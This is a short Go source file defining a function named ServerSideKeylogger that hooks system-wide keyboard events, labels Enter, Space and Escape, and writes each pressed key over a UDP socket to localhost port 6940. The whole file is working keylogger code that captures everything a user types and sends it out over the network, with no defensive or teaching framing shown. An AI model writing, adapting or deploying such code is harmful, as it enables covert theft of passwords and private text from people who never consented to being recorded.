package server

import (
	"fmt"
	"log"
	"net"

	hook "github.com/robotn/gohook"
)

func ServerSideKeylogger() {

	evchan := hook.Start()
	defer hook.End()
	// setting address
	addr, err := net.ResolveUDPAddr("udp", "localhost:6940")

	if err != nil {
		fmt.Println(err)
		return
	}

	// setting connections

	conn, err := net.DialUDP("udp", nil, addr)

	if err != nil {
		fmt.Println(err)
	}
	// close connection at the end
	defer conn.Close()
	// reading the keystrokes

	for k := range evchan {
		if k.Kind == hook.KeyDown {
			keystroke := string(k.Keychar)

			switch k.Keychar {
			case 13:
				keystroke = "Return(Enter)"
			case 32:
				keystroke = "Space"
			case 27:
				keystroke = "Escape"
			}

			//fmt.Printf("Pressing: %s\n", keystroke)

			conn.Write([]byte(keystroke))
			if err != nil {
				log.Panic(err)
				return
			}
		}
	}
}
